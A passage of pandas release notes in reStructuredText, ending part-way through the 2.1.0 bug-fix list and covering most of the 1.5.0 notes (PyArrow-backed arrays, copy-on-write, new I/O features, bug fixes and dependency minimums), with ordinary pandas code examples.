instead (:issue:`31356`, :issue:`54592`)\n- Bug where the :class:`DataFrame` repr would not work when a column had an :class:`ArrowDtype` with a ``pyarrow.ExtensionDtype`` (:issue:`54063`)\n- Bug where the ``__from_arrow__`` method of masked ExtensionDtypes (e.g. :class:`Float64Dtype`, :class:`BooleanDtype`) would not accept PyArrow arrays of type ``pyarrow.null()`` (:issue:`52223`)\n\nStyler\n^^^^^^\n- Bug in :meth:`.Styler._copy` calling overridden methods in subclasses of :class:`.Styler` (:issue:`52728`)\n\nMetadata\n^^^^^^^^\n- Fixed metadata propagation in :meth:`DataFrame.max`, :meth:`DataFrame.min`, :meth:`DataFrame.prod`, :meth:`DataFrame.mean`, :meth:`Series.mode`, :meth:`DataFrame.median`, :meth:`DataFrame.sem`, :meth:`DataFrame.skew`, :meth:`DataFrame.kurt` (:issue:`28283`)\n- Fixed metadata propagation in :meth:`DataFrame.squeeze`, and :meth:`DataFrame.describe` (:issue:`28283`)\n- Fixed metadata propagation in :meth:`DataFrame.std` (:issue:`28283`)\n\nOther\n^^^^^\n- Bug in :class:`.FloatingArray.__contains__` with ``NaN`` item incorrectly returning ``False`` when ``NaN`` values are present (:issue:`52840`)\n- Bug in :class:`DataFrame` and :class:`Series` raising for data of complex dtype when ``NaN`` values are present (:issue:`53627`)\n- Bug in :class:`DatetimeIndex` where ``repr`` of index passed with time does not print time is midnight and non-day based freq(:issue:`53470`)\n- Bug in :func:`.testing.assert_frame_equal` and :func:`.testing.assert_series_equal` now throw assertion error for two unequal sets (:issue:`51727`)\n- Bug in :func:`.testing.assert_frame_equal` checks category dtypes even when asked not to check index type (:issue:`52126`)\n- Bug in :func:`api.interchange.from_dataframe` was not respecting ``allow_copy`` argument (:issue:`54322`)\n- Bug in :func:`api.interchange.from_dataframe` was raising during interchanging from non-pandas tz-aware data containing null values (:issue:`54287`)\n- Bug in :func:`api.interchange.from_dataframe` when converting an empty DataFrame object (:issue:`53155`)\n- Bug in :func:`from_dummies` where the resulting :class:`Index` did not match the original :class:`Index` (:issue:`54300`)\n- Bug in :func:`from_dummies` where the resulting data would always be ``object`` dtype instead of the dtype of the columns (:issue:`54300`)\n- Bug in :meth:`.DataFrameGroupBy.first`, :meth:`.DataFrameGroupBy.last`, :meth:`.SeriesGroupBy.first`, and :meth:`.SeriesGroupBy.last` where an empty group would return ``np.nan`` instead of the corresponding :class:`.ExtensionArray` NA value (:issue:`39098`)\n- Bug in :meth:`DataFrame.pivot_table` with casting the mean of ints back to an int (:issue:`16676`)\n- Bug in :meth:`DataFrame.reindex` with a ``fill_value`` that should be inferred with a :class:`ExtensionDtype` incorrectly inferring ``object`` dtype (:issue:`52586`)\n- Bug in :meth:`DataFrame.shift` with ``axis=1`` on a :class:`DataFrame` with a single :class:`ExtensionDtype` column giving incorrect results (:issue:`53832`)\n- Bug in :meth:`Index.sort_values` when a ``key`` is passed (:issue:`52764`)\n- Bug in :meth:`Series.align`, :meth:`DataFrame.align`, :meth:`Series.reindex`, :meth:`DataFrame.reindex`, :meth:`Series.interpolate`, :meth:`DataFrame.interpolate`, incorrectly failing to raise with method=\"asfreq\" (:issue:`53620`)\n- Bug in :meth:`Series.argsort` failing to raise when an invalid ``axis`` is passed (:issue:`54257`)\n- Bug in :meth:`Series.map` when giving a callable to an empty series, the returned series had ``object`` dtype. It now keeps the original dtype (:issue:`52384`)\n- Bug in :meth:`Series.memory_usage` when ``deep=True`` throw an error with Series of objects and the returned value is incorrect, as it does not take into account GC corrections (:issue:`51858`)\n- Bug in :meth:`period_range` the default behavior when freq was not passed as an argument was incorrect(:issue:`53687`)\n- Fixed incorrect ``__name__`` attribute of ``pandas._libs.json`` (:issue:`52898`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_210.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v2.0.3..v2.1.0\n", "1.5.0": ".. _whatsnew_150:\n\nWhat's new in 1.5.0 (September 19, 2022)\n----------------------------------------\n\nThese are the changes in pandas 1.5.0. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_150.enhancements:\n\nEnhancements\n~~~~~~~~~~~~\n\n.. _whatsnew_150.enhancements.pandas-stubs:\n\n``pandas-stubs``\n^^^^^^^^^^^^^^^^\n\nThe ``pandas-stubs`` library is now supported by the pandas development team, providing type stubs for the pandas API. Please visit\nhttps://github.com/pandas-dev/pandas-stubs for more information.\n\nWe thank VirtusLab and Microsoft for their initial, significant contributions to ``pandas-stubs``\n\n.. _whatsnew_150.enhancements.arrow:\n\nNative PyArrow-backed ExtensionArray\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nWith `Pyarrow <https://arrow.apache.org/docs/python/index.html>`__ installed, users can now create pandas objects\nthat are backed by a ``pyarrow.ChunkedArray`` and ``pyarrow.DataType``.\n\nThe ``dtype`` argument can accept a string of a `pyarrow data type <https://arrow.apache.org/docs/python/api/datatypes.html>`__\nwith ``pyarrow`` in brackets e.g. ``\"int64[pyarrow]\"`` or, for pyarrow data types that take parameters, a :class:`ArrowDtype`\ninitialized with a ``pyarrow.DataType``.\n\n.. ipython:: python\n\n    import pyarrow as pa\n    ser_float = pd.Series([1.0, 2.0, None], dtype=\"float32[pyarrow]\")\n    ser_float\n\n    list_of_int_type = pd.ArrowDtype(pa.list_(pa.int64()))\n    ser_list = pd.Series([[1, 2], [3, None]], dtype=list_of_int_type)\n    ser_list\n\n    ser_list.take([1, 0])\n    ser_float * 5\n    ser_float.mean()\n    ser_float.dropna()\n\nMost operations are supported and have been implemented using `pyarrow compute <https://arrow.apache.org/docs/python/api/compute.html>`__ functions.\nWe recommend installing the latest version of PyArrow to access the most recently implemented compute functions.\n\n.. warning::\n\n    This feature is experimental, and the API can change in a future release without warning.\n\n.. _whatsnew_150.enhancements.dataframe_interchange:\n\nDataFrame interchange protocol implementation\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nPandas now implement the DataFrame interchange API spec.\nSee the full details on the API at https://data-apis.org/dataframe-protocol/latest/index.html\n\nThe protocol consists of two parts:\n\n- New method :meth:`DataFrame.__dataframe__` which produces the interchange object.\n  It effectively \"exports\" the pandas dataframe as an interchange object so\n  any other library which has the protocol implemented can \"import\" that dataframe\n  without knowing anything about the producer except that it makes an interchange object.\n- New function :func:`pandas.api.interchange.from_dataframe` which can take\n  an arbitrary interchange object from any conformant library and construct a\n  pandas DataFrame out of it.\n\n.. _whatsnew_150.enhancements.styler:\n\nStyler\n^^^^^^\n\nThe most notable development is the new method :meth:`.Styler.concat` which\nallows adding customised footer rows to visualise additional calculations on the data,\ne.g. totals and counts etc. (:issue:`43875`, :issue:`46186`)\n\nAdditionally there is an alternative output method :meth:`.Styler.to_string`,\nwhich allows using the Styler's formatting methods to create, for example, CSVs (:issue:`44502`).\n\nA new feature :meth:`.Styler.relabel_index` is also made available to provide full customisation of the display of\nindex or column headers (:issue:`47864`)\n\nMinor feature improvements are:\n\n  - Adding the ability to render ``border`` and ``border-{side}`` CSS properties in Excel (:issue:`42276`)\n  - Making keyword arguments consist: :meth:`.Styler.highlight_null` now accepts ``color`` and deprecates ``null_color`` although this remains backwards compatible (:issue:`45907`)\n\n.. _whatsnew_150.enhancements.resample_group_keys:\n\nControl of index with ``group_keys`` in :meth:`DataFrame.resample`\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe argument ``group_keys`` has been added to the method :meth:`DataFrame.resample`.\nAs with :meth:`DataFrame.groupby`, this argument controls the whether each group is added\nto the index in the resample when :meth:`.Resampler.apply` is used.\n\n.. warning::\n   Not specifying the ``group_keys`` argument will retain the\n   previous behavior and emit a warning if the result will change\n   by specifying ``group_keys=False``. In a future version\n   of pandas, not specifying ``group_keys`` will default to\n   the same behavior as ``group_keys=False``.\n\n.. code-block:: ipython\n\n    In [11]: df = pd.DataFrame(\n       ....:     {'a': range(6)},\n       ....:     index=pd.date_range(\"2021-01-01\", periods=6, freq=\"8H\")\n       ....: )\n       ....:\n\n    In [12]: df.resample(\"D\", group_keys=True).apply(lambda x: x)\n    Out[12]:\n                                    a\n    2021-01-01 2021-01-01 00:00:00  0\n               2021-01-01 08:00:00  1\n               2021-01-01 16:00:00  2\n    2021-01-02 2021-01-02 00:00:00  3\n               2021-01-02 08:00:00  4\n               2021-01-02 16:00:00  5\n\n    In [13]: df.resample(\"D\", group_keys=False).apply(lambda x: x)\n    Out[13]:\n                         a\n    2021-01-01 00:00:00  0\n    2021-01-01 08:00:00  1\n    2021-01-01 16:00:00  2\n    2021-01-02 00:00:00  3\n    2021-01-02 08:00:00  4\n    2021-01-02 16:00:00  5\n\nPreviously, the resulting index would depend upon the values returned by ``apply``,\nas seen in the following example.\n\n.. code-block:: ipython\n\n    In [1]: # pandas 1.3\n    In [2]: df.resample(\"D\").apply(lambda x: x)\n    Out[2]:\n                         a\n    2021-01-01 00:00:00  0\n    2021-01-01 08:00:00  1\n    2021-01-01 16:00:00  2\n    2021-01-02 00:00:00  3\n    2021-01-02 08:00:00  4\n    2021-01-02 16:00:00  5\n\n    In [3]: df.resample(\"D\").apply(lambda x: x.reset_index())\n    Out[3]:\n                               index  a\n    2021-01-01 0 2021-01-01 00:00:00  0\n               1 2021-01-01 08:00:00  1\n               2 2021-01-01 16:00:00  2\n    2021-01-02 0 2021-01-02 00:00:00  3\n               1 2021-01-02 08:00:00  4\n               2 2021-01-02 16:00:00  5\n\n.. _whatsnew_150.enhancements.from_dummies:\n\nfrom_dummies\n^^^^^^^^^^^^\n\nAdded new function :func:`~pandas.from_dummies` to convert a dummy coded :class:`DataFrame` into a categorical :class:`DataFrame`.\n\n.. ipython:: python\n\n    import pandas as pd\n\n    df = pd.DataFrame({\"col1_a\": [1, 0, 1], \"col1_b\": [0, 1, 0],\n                       \"col2_a\": [0, 1, 0], \"col2_b\": [1, 0, 0],\n                       \"col2_c\": [0, 0, 1]})\n\n    pd.from_dummies(df, sep=\"_\")\n\n.. _whatsnew_150.enhancements.orc:\n\nWriting to ORC files\n^^^^^^^^^^^^^^^^^^^^\n\nThe new method :meth:`DataFrame.to_orc` allows writing to ORC files (:issue:`43864`).\n\nThis functionality depends the `pyarrow <http://arrow.apache.org/docs/python/>`__ library. For more details, see :ref:`the IO docs on ORC <io.orc>`.\n\n.. warning::\n\n   * It is *highly recommended* to install pyarrow using conda due to some issues occurred by pyarrow.\n   * :func:`~pandas.DataFrame.to_orc` requires pyarrow>=7.0.0.\n   * :func:`~pandas.DataFrame.to_orc` is not supported on Windows yet, you can find valid environments on :ref:`install optional dependencies <install.warn_orc>`.\n   * For supported dtypes please refer to `supported ORC features in Arrow <https://arrow.apache.org/docs/cpp/orc.html#data-types>`__.\n   * Currently timezones in datetime columns are not preserved when a dataframe is converted into ORC files.\n\n.. code-block:: python\n\n    df = pd.DataFrame(data={\"col1\": [1, 2], \"col2\": [3, 4]})\n    df.to_orc(\"./out.orc\")\n\n.. _whatsnew_150.enhancements.tar:\n\nReading directly from TAR archives\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nI/O methods like :func:`read_csv` or :meth:`DataFrame.to_json` now allow reading and writing\ndirectly on TAR archives (:issue:`44787`).\n\n.. code-block:: python\n\n   df = pd.read_csv(\"./movement.tar.gz\")\n   # ...\n   df.to_csv(\"./out.tar.gz\")\n\nThis supports ``.tar``, ``.tar.gz``, ``.tar.bz`` and ``.tar.xz2`` archives.\nThe used compression method is inferred from the filename.\nIf the compression method cannot be inferred, use the ``compression`` argument:\n\n.. code-block:: python\n\n   df = pd.read_csv(some_file_obj, compression={\"method\": \"tar\", \"mode\": \"r:gz\"}) # noqa F821\n\n(``mode`` being one of ``tarfile.open``'s modes: https://docs.python.org/3/library/tarfile.html#tarfile.open)\n\n\n.. _whatsnew_150.enhancements.read_xml_dtypes:\n\nread_xml now supports ``dtype``, ``converters``, and ``parse_dates``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nSimilar to other IO methods, :func:`pandas.read_xml` now supports assigning specific dtypes to columns,\napply converter methods, and parse dates (:issue:`43567`).\n\n.. ipython:: python\n\n    from io import StringIO\n    xml_dates = \"\"\"<?xml version='1.0' encoding='utf-8'?>\n    <data>\n      <row>\n        <shape>square</shape>\n        <degrees>00360</degrees>\n        <sides>4.0</sides>\n        <date>2020-01-01</date>\n       </row>\n      <row>\n        <shape>circle</shape>\n        <degrees>00360</degrees>\n        <sides/>\n        <date>2021-01-01</date>\n      </row>\n      <row>\n        <shape>triangle</shape>\n        <degrees>00180</degrees>\n        <sides>3.0</sides>\n        <date>2022-01-01</date>\n      </row>\n    </data>\"\"\"\n\n    df = pd.read_xml(\n        StringIO(xml_dates),\n        dtype={'sides': 'Int64'},\n        converters={'degrees': str},\n        parse_dates=['date']\n    )\n    df\n    df.dtypes\n\n\n.. _whatsnew_150.enhancements.read_xml_iterparse:\n\nread_xml now supports large XML using ``iterparse``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nFor very large XML files that can range in hundreds of megabytes to gigabytes, :func:`pandas.read_xml`\nnow supports parsing such sizeable files using `lxml's iterparse`_ and `etree's iterparse`_\nwhich are memory-efficient methods to iterate through XML trees and extract specific elements\nand attributes without holding entire tree in memory (:issue:`45442`).\n\n.. code-block:: ipython\n\n    In [1]: df = pd.read_xml(\n    ...      \"/path/to/downloaded/enwikisource-latest-pages-articles.xml\",\n    ...      iterparse = {\"page\": [\"title\", \"ns\", \"id\"]})\n    ...  )\n    df\n    Out[2]:\n                                                         title   ns        id\n    0                                       Gettysburg Address    0     21450\n    1                                                Main Page    0     42950\n    2                            Declaration by United Nations    0      8435\n    3             Constitution of the United States of America    0      8435\n    4                     Declaration of Independence (Israel)    0     17858\n    ...                                                    ...  ...       ...\n    3578760               Page:Black cat 1897 07 v2 n10.pdf/17  104    219649\n    3578761               Page:Black cat 1897 07 v2 n10.pdf/43  104    219649\n    3578762               Page:Black cat 1897 07 v2 n10.pdf/44  104    219649\n    3578763      The History of Tom Jones, a Foundling/Book IX    0  12084291\n    3578764  Page:Shakespeare of Stratford (1926) Yale.djvu/91  104     21450\n\n    [3578765 rows x 3 columns]\n\n\n.. _`lxml's iterparse`: https://lxml.de/3.2/parsing.html#iterparse-and-iterwalk\n.. _`etree's iterparse`: https://docs.python.org/3/library/xml.etree.elementtree.html#xml.etree.ElementTree.iterparse\n\n.. _whatsnew_150.enhancements.copy_on_write:\n\nCopy on Write\n^^^^^^^^^^^^^\n\nA new feature ``copy_on_write`` was added (:issue:`46958`). Copy on write ensures that\nany DataFrame or Series derived from another in any way always behaves as a copy.\nCopy on write disallows updating any other object than the object the method\nwas applied to.\n\nCopy on write can be enabled through:\n\n.. code-block:: python\n\n    pd.set_option(\"mode.copy_on_write\", True)\n    pd.options.mode.copy_on_write = True\n\nAlternatively, copy on write can be enabled locally through:\n\n.. code-block:: python\n\n    with pd.option_context(\"mode.copy_on_write\", True):\n        ...\n\nWithout copy on write, the parent :class:`DataFrame` is updated when updating a child\n:class:`DataFrame` that was derived from this :class:`DataFrame`.\n\n.. ipython:: python\n\n    df = pd.DataFrame({\"foo\": [1, 2, 3], \"bar\": 1})\n    view = df[\"foo\"]\n    view.iloc[0]\n    df\n\nWith copy on write enabled, df won't be updated anymore:\n\n.. ipython:: python\n\n    with pd.option_context(\"mode.copy_on_write\", True):\n        df = pd.DataFrame({\"foo\": [1, 2, 3], \"bar\": 1})\n        view = df[\"foo\"]\n        view.iloc[0]\n        df\n\nA more detailed explanation can be found `here <https://phofl.github.io/cow-introduction.html>`_.\n\n.. _whatsnew_150.enhancements.other:\n\nOther enhancements\n^^^^^^^^^^^^^^^^^^\n- :meth:`Series.map` now raises when ``arg`` is dict but ``na_action`` is not either ``None`` or ``'ignore'`` (:issue:`46588`)\n- :meth:`MultiIndex.to_frame` now supports the argument ``allow_duplicates`` and raises on duplicate labels if it is missing or False (:issue:`45245`)\n- :class:`.StringArray` now accepts array-likes containing nan-likes (``None``, ``np.nan``) for the ``values`` parameter in its constructor in addition to strings and :attr:`pandas.NA`. (:issue:`40839`)\n- Improved the rendering of ``categories`` in :class:`CategoricalIndex` (:issue:`45218`)\n- :meth:`DataFrame.plot` will now allow the ``subplots`` parameter to be a list of iterables specifying column groups, so that columns may be grouped together in the same subplot (:issue:`29688`).\n- :meth:`to_numeric` now preserves float64 arrays when downcasting would generate values not representable in float32 (:issue:`43693`)\n- :meth:`Series.reset_index` and :meth:`DataFrame.reset_index` now support the argument ``allow_duplicates`` (:issue:`44410`)\n- :meth:`.DataFrameGroupBy.min`, :meth:`.SeriesGroupBy.min`, :meth:`.DataFrameGroupBy.max`, and :meth:`.SeriesGroupBy.max` now supports `Numba <https://numba.pydata.org/>`_ execution with the ``engine`` keyword (:issue:`45428`)\n- :func:`read_csv` now supports ``defaultdict`` as a ``dtype`` parameter (:issue:`41574`)\n- :meth:`DataFrame.rolling` and :meth:`Series.rolling` now support a ``step`` parameter with fixed-length windows (:issue:`15354`)\n- Implemented a ``bool``-dtype :class:`Index`, passing a bool-dtype array-like to ``pd.Index`` will now retain ``bool`` dtype instead of casting to ``object`` (:issue:`45061`)\n- Implemented a complex-dtype :class:`Index`, passing a complex-dtype array-like to ``pd.Index`` will now retain complex dtype instead of casting to ``object`` (:issue:`45845`)\n- :class:`Series` and :class:`DataFrame` with :class:`IntegerDtype` now supports bitwise operations (:issue:`34463`)\n- Add ``milliseconds`` field support for :class:`.DateOffset` (:issue:`43371`)\n- :meth:`DataFrame.where` tries to maintain dtype of :class:`DataFrame` if fill value can be cast without loss of precision (:issue:`45582`)\n- :meth:`DataFrame.reset_index` now accepts a ``names`` argument which renames the index names (:issue:`6878`)\n- :func:`concat` now raises when ``levels`` is given but ``keys`` is None (:issue:`46653`)\n- :func:`concat` now raises when ``levels`` contains duplicate values (:issue:`46653`)\n- Added ``numeric_only`` argument to :meth:`DataFrame.corr`, :meth:`DataFrame.corrwith`, :meth:`DataFrame.cov`, :meth:`DataFrame.idxmin`, :meth:`DataFrame.idxmax`, :meth:`.DataFrameGroupBy.idxmin`, :meth:`.DataFrameGroupBy.idxmax`, :meth:`.DataFrameGroupBy.var`, :meth:`.SeriesGroupBy.var`, :meth:`.DataFrameGroupBy.std`, :meth:`.SeriesGroupBy.std`, :meth:`.DataFrameGroupBy.sem`, :meth:`.SeriesGroupBy.sem`, and :meth:`.DataFrameGroupBy.quantile` (:issue:`46560`)\n- A :class:`errors.PerformanceWarning` is now thrown when using ``string[pyarrow]`` dtype with methods that don't dispatch to ``pyarrow.compute`` methods (:issue:`42613`, :issue:`46725`)\n- Added ``validate`` argument to :meth:`DataFrame.join` (:issue:`46622`)\n- Added ``numeric_only`` argument to :meth:`.Resampler.sum`, :meth:`.Resampler.prod`, :meth:`.Resampler.min`, :meth:`.Resampler.max`, :meth:`.Resampler.first`, and :meth:`.Resampler.last` (:issue:`46442`)\n- ``times`` argument in :class:`.ExponentialMovingWindow` now accepts ``np.timedelta64`` (:issue:`47003`)\n- :class:`.DataError`, :class:`.SpecificationError`, :class:`.SettingWithCopyError`, :class:`.SettingWithCopyWarning`, :class:`.NumExprClobberingError`, :class:`.UndefinedVariableError`, :class:`.IndexingError`, :class:`.PyperclipException`, :class:`.PyperclipWindowsException`, :class:`.CSSWarning`, :class:`.PossibleDataLossError`, :class:`.ClosedFileError`, :class:`.IncompatibilityWarning`, :class:`.AttributeConflictWarning`, :class:`.DatabaseError`, :class:`.PossiblePrecisionLoss`, :class:`.ValueLabelTypeMismatch`, :class:`.InvalidColumnName`, and :class:`.CategoricalConversionWarning` are now exposed in ``pandas.errors`` (:issue:`27656`)\n- Added ``check_like`` argument to :func:`testing.assert_series_equal` (:issue:`47247`)\n- Add support for :meth:`.DataFrameGroupBy.ohlc` and :meth:`.SeriesGroupBy.ohlc` for extension array dtypes (:issue:`37493`)\n- Allow reading compressed SAS files with :func:`read_sas` (e.g., ``.sas7bdat.gz`` files)\n- :func:`pandas.read_html` now supports extracting links from table cells (:issue:`13141`)\n- :meth:`DatetimeIndex.astype` now supports casting timezone-naive indexes to ``datetime64[s]``, ``datetime64[ms]``, and ``datetime64[us]``, and timezone-aware indexes to the corresponding ``datetime64[unit, tzname]`` dtypes (:issue:`47579`)\n- :class:`Series` reducers (e.g. ``min``, ``max``, ``sum``, ``mean``) will now successfully operate when the dtype is numeric and ``numeric_only=True`` is provided; previously this would raise a ``NotImplementedError`` (:issue:`47500`)\n- :meth:`RangeIndex.union` now can return a :class:`RangeIndex` instead of a :class:`Int64Index` if the resulting values are equally spaced (:issue:`47557`, :issue:`43885`)\n- :meth:`DataFrame.compare` now accepts an argument ``result_names`` to allow the user to specify the result's names of both left and right DataFrame which are being compared. This is by default ``'self'`` and ``'other'`` (:issue:`44354`)\n- :meth:`DataFrame.quantile` gained a ``method`` argument that can accept ``table`` to evaluate multi-column quantiles (:issue:`43881`)\n- :class:`Interval` now supports checking whether one interval is contained by another interval (:issue:`46613`)\n- Added ``copy`` keyword to :meth:`Series.set_axis` and :meth:`DataFrame.set_axis` to allow user to set axis on a new object without necessarily copying the underlying data (:issue:`47932`)\n- The method :meth:`.ExtensionArray.factorize` accepts ``use_na_sentinel=False`` for determining how null values are to be treated (:issue:`46601`)\n- The ``Dockerfile`` now installs a dedicated ``pandas-dev`` virtual environment for pandas development instead of using the ``base`` environment (:issue:`48427`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_150.notable_bug_fixes:\n\nNotable bug fixes\n~~~~~~~~~~~~~~~~~\n\nThese are bug fixes that might have notable behavior changes.\n\n.. _whatsnew_150.notable_bug_fixes.groupby_transform_dropna:\n\nUsing ``dropna=True`` with ``groupby`` transforms\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nA transform is an operation whose result has the same size as its input. When the\nresult is a :class:`DataFrame` or :class:`Series`, it is also required that the\nindex of the result matches that of the input. In pandas 1.4, using\n:meth:`.DataFrameGroupBy.transform` or :meth:`.SeriesGroupBy.transform` with null\nvalues in the groups and ``dropna=True`` gave incorrect results. Demonstrated by the\nexamples below, the incorrect results either contained incorrect values, or the result\ndid not have the same index as the input.\n\n.. ipython:: python\n\n    df = pd.DataFrame({'a': [1, 1, np.nan], 'b': [2, 3, 4]})\n\n*Old behavior*:\n\n.. code-block:: ipython\n\n    In [3]: # Value in the last row should be np.nan\n            df.groupby('a', dropna=True).transform('sum')\n    Out[3]:\n       b\n    0  5\n    1  5\n    2  5\n\n    In [3]: # Should have one additional row with the value np.nan\n            df.groupby('a', dropna=True).transform(lambda x: x.sum())\n    Out[3]:\n       b\n    0  5\n    1  5\n\n    In [3]: # The value in the last row is np.nan interpreted as an integer\n            df.groupby('a', dropna=True).transform('ffill')\n    Out[3]:\n                         b\n    0                    2\n    1                    3\n    2 -9223372036854775808\n\n    In [3]: # Should have one additional row with the value np.nan\n            df.groupby('a', dropna=True).transform(lambda x: x)\n    Out[3]:\n       b\n    0  2\n    1  3\n\n*New behavior*:\n\n.. ipython:: python\n\n    df.groupby('a', dropna=True).transform('sum')\n    df.groupby('a', dropna=True).transform(lambda x: x.sum())\n    df.groupby('a', dropna=True).transform('ffill')\n    df.groupby('a', dropna=True).transform(lambda x: x)\n\n.. _whatsnew_150.notable_bug_fixes.to_json_incorrectly_localizing_naive_timestamps:\n\nSerializing tz-naive Timestamps with to_json() with ``iso_dates=True``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:meth:`DataFrame.to_json`, :meth:`Series.to_json`, and :meth:`Index.to_json`\nwould incorrectly localize DatetimeArrays/DatetimeIndexes with tz-naive Timestamps\nto UTC. (:issue:`38760`)\n\nNote that this patch does not fix the localization of tz-aware Timestamps to UTC\nupon serialization. (Related issue :issue:`12997`)\n\n*Old Behavior*\n\n.. code-block:: ipython\n\n    In [32]: index = pd.date_range(\n       ....:     start='2020-12-28 00:00:00',\n       ....:     end='2020-12-28 02:00:00',\n       ....:     freq='1H',\n       ....: )\n       ....:\n\n    In [33]: a = pd.Series(\n       ....:     data=range(3),\n       ....:     index=index,\n       ....: )\n       ....:\n\n    In [4]: from io import StringIO\n\n    In [5]: a.to_json(date_format='iso')\n    Out[5]: '{\"2020-12-28T00:00:00.000Z\":0,\"2020-12-28T01:00:00.000Z\":1,\"2020-12-28T02:00:00.000Z\":2}'\n\n    In [6]: pd.read_json(StringIO(a.to_json(date_format='iso')), typ=\"series\").index == a.index\n    Out[6]: array([False, False, False])\n\n*New Behavior*\n\n.. code-block:: ipython\n\n    In [34]: from io import StringIO\n\n    In [35]: a.to_json(date_format='iso')\n    Out[35]: '{\"2020-12-28T00:00:00.000Z\":0,\"2020-12-28T01:00:00.000Z\":1,\"2020-12-28T02:00:00.000Z\":2}'\n\n    # Roundtripping now works\n    In [36]: pd.read_json(StringIO(a.to_json(date_format='iso')), typ=\"series\").index == a.index\n    Out[36]: array([ True,  True,  True])\n\n.. _whatsnew_150.notable_bug_fixes.groupby_value_counts_categorical:\n\nDataFrameGroupBy.value_counts with non-grouping categorical columns and ``observed=True``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nCalling :meth:`.DataFrameGroupBy.value_counts` with ``observed=True`` would incorrectly drop non-observed categories of non-grouping columns (:issue:`46357`).\n\n.. code-block:: ipython\n\n    In [6]: df = pd.DataFrame([\"a\", \"b\", \"c\"], dtype=\"category\").iloc[0:2]\n    In [7]: df\n    Out[7]:\n       0\n    0  a\n    1  b\n\n*Old Behavior*\n\n.. code-block:: ipython\n\n    In [8]: df.groupby(level=0, observed=True).value_counts()\n    Out[8]:\n    0  a    1\n    1  b    1\n    dtype: int64\n\n\n*New Behavior*\n\n.. code-block:: ipython\n\n    In [9]: df.groupby(level=0, observed=True).value_counts()\n    Out[9]:\n    0  a    1\n    1  a    0\n       b    1\n    0  b    0\n       c    0\n    1  c    0\n    dtype: int64\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_150.api_breaking:\n\nBackwards incompatible API changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n.. _whatsnew_150.api_breaking.deps:\n\nIncreased minimum versions for dependencies\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nSome minimum supported versions of dependencies were updated.\nIf installed, we now require:\n\n+-----------------+-----------------+----------+---------+\n| Package         | Minimum Version | Required | Changed |\n+=================+=================+==========+=========+\n| numpy           | 1.20.3          |    X     |    X    |\n+-----------------+-----------------+----------+---------+\n| mypy (dev)      | 0.971           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| beautifulsoup4  | 4.9.3           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| blosc           | 1.21.0          |          |    X    |\n+-----------------+-----------------+----------+---------+\n| bottleneck      | 1.3.2           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| fsspec          | 2021.07.0       |          |    X    |\n+-----------------+-----------------+----------+---------+\n| hypothesis      | 6.13.0          |          |    X    |\n+-----------------+-----------------+----------+---------+\n| gcsfs           | 2021.07.0       |          |    X    |\n+-----------------+-----------------+----------+---------+\n| jinja2          | 3.0.0           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| lxml            | 4.6.3           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| numba           | 0.53.1          |          |    X    |\n+-----------------+-----------------+----------+---------+\n| numexpr         | 2.7.3           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| openpyxl        | 3.0.7           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| pandas-gbq      | 0.15.0          |          |    X    |\n+-----------------+-----------------+----------+---------+\n| psycopg2        | 2.8.6           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| pymysql         | 1.0.2           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| pyreadstat      | 1.1.2           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| pyxlsb          | 1.0.8           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| s3fs            | 2021.08.0       |          |    X    |\n+-----------------+-----------------+----------+---------+\n| scipy           | 1.7.1           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| sqlalchemy      | 1.4.16          |          |    X    |\n+-----------------+-----------------+----------+---------+\n| tabulate        | 0.8.9           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| xarray          | 0.19.0          |          |    X    |\n+-----------------+-----------------+----------+---------+\n| xlsxwriter      | 1.4.3           |          |    X    |\n+-----------------+-----------------+----------+---------+\n\nFor `optional libraries <https://pandas.pydata.org/docs/getting_started/install.html>`_ the general recommendation is to use the latest version.\nThe following table lists the lowest version per library that is currently being tested throughout the development of pandas.\nOptional libraries below the lowest tested version may still work, but are not considered supported.\n\n+-----------------+-----------------+---------+\n| Package         | Minimum Version | Changed |\n+=================+=================+=========+\n| beautifulsoup4  |4.9.3            |    X    |\n+-----------------+-----------------+---------+\n| blosc           |1.21.0           |    X    |\n+-----------------+-----------------+---------+\n| bottleneck      |1.3.2            |    X    |\n+-----------------+-----------------+---------+\n| brotlipy        |0.7.0            |         |\n+-----------------+-----------------+---------+\n| fastparquet     |0.4.0            |         |\n+-----------------+-----------------+---------+\n| fsspec          |2021.08.0        |    X    |\n+-----------------+-----------------+---------+\n| html5lib        |1.1        